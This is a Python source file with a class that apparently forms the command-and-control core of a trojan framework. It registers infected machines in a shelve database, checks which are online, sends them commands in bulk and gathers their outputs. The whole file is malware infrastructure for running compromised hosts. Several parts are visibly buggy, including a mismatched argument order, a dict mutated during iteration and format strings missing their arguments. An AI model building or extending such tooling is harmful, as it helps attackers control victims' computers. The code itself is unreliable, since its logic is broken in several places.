import threading
import shelve


class TrojanManagement(threading.Thread):

    def __init__(self, shelve_filename):
        self.shelve_filename = shelve_filename
        # The shelf contains the persistent data about the trojans, such as logs, meta data etc.
        # If something is a key in the shelf also determines, whether that trojan already is registered
        self.shelf = self.load_shelf()

        # The return dict contains the trojan ids and the commands executed on them as combined string keys and the
        # return values from those processes as the values
        self.return_dict = {}

        # The trojan dict contains the trojan ids as string keys and the Trojan objects as values
        self.trojan_dict = {}

        # This is a temporary list, that buffers tripels about commands executed on trojans, but the returns not yet
        # aquired: (trojan_id, command_id, command_name)
        self._pending_returns = []
        self.running = False

    def run(self):
        self.running = True

        while self.running:
            # TODO: Put those processes into their own methods
            # TODO: Add a logging process, that monitors the length of those collections and the time needed for the loops
            # Garbage collection
            for trojan_id, trojan in self.trojan_dict.items():
                if not trojan.online:
                    # Finally terminating the trojan for real
                    trojan.terminate()
                    # Removing the trojan from the dict of online trojans
                    del self.trojan_dict[trojan_id]

            # Getting the returns
            # TODO: This mechanic does not yet incorporate duplicate command results in the dict
            for trojan_id, command_id, command_name in self._pending_returns:
                if self[trojan_id].has_return(command_id):
                    return_value = self[trojan_id].get_return(command_id)
                    # Adding the return to the return dict
                    self.return_dict["{}:{}".format(command_name, trojan_id)] = return_value
                    # Removing from the list, as the result is not pending anymore
                    self._pending_returns.remove((trojan_id, command_id))

            # Updating the database
            self.sync_shelf()

    def register_trojan(self, trojan_id):
        # Checking first if that id is already registered, because this method cannot be used for overriding an entry
        # raising an error, in case already registered
        if self.trojan_registered(trojan_id):
            raise KeyError("Attempting to override data, already registered to {}".format(trojan_id))

        # Simply adding a new entry to the shelf database
        self.shelf[trojan_id] = {}

    def add_trojan(self, trojan_id, trojan):
        # Adding the trojan to the trojan manage dict, in case the trojan already registered in shelf
        if self.trojan_registered(trojan_id):
            self.trojan_dict[trojan_id] = trojan
        else:
            self.register_trojan(trojan_id)
            # Now that the trojan is registered, the method can be called recursively
            self.add_trojan(trojan_id, trojan)

    def trojan_registered(self, trojan_id):
        return trojan_id in self.shelf.keys()

    def trojan_online(self, trojan_id):
        return (trojan_id in self.trojan_dict.keys()) and self[trojan_id].online

    def execute(self, trojan_id_list, command, priority, pos_args, kw_args, treat_missing=False):
        # This list will be used to save all the trojan id's for which the command could at least be issued to the
        # according Trojan object, because the trojan with that id both exists and is online
        successfully_passed = []

        # The list with the id's, so that the return values can be fetched from the outputs of the trojans after the
        # command has been processed
        command_ids = []

        # Going through the list of the trojans for which to execute the command
        for trojan_id in trojan_id_list:

            # Only if the flag is set True, exceptions will be risen if a command could not be issued to a Trojan,
            # because it either does not exist, or is not online atm.
            if treat_missing:
                if not self.trojan_registered(trojan_id):
                    raise KeyError("The trojan by the id '{}' does not exist")
                else:
                    if not self.trojan_online(trojan_id):
                        raise KeyError("The trojan by the id '{}' is not online")

            # In case the trojan is online passing it the command and adding the id to the list of actually online tr.
            if self.trojan_online(trojan_id):
                command_id = self[trojan_id].execute(command, priority, pos_args, kw_args)
                command_ids.append(command_id)
                successfully_passed.append(trojan_id)

        # Adding the trojan ids and the command ids to the pending returns list
        self._add_pending_returns(successfully_passed, command_ids, command)

        return successfully_passed, command_ids

    def load_shelf(self):
        # TODO: catch the exceptions and rise more specific ones
        shelf = shelve.open(self.shelve_filename)
        return shelf

    def sync_shelf(self):
        self.shelf.sync()

    def _add_pending_returns(self, command_name, trojan_ids, command_ids):
        tuple_list = list(zip(trojan_ids, command_ids, command_name))
        self._pending_returns += tuple_list

    def __getitem__(self, item):
        return self.trojan_dict[item]

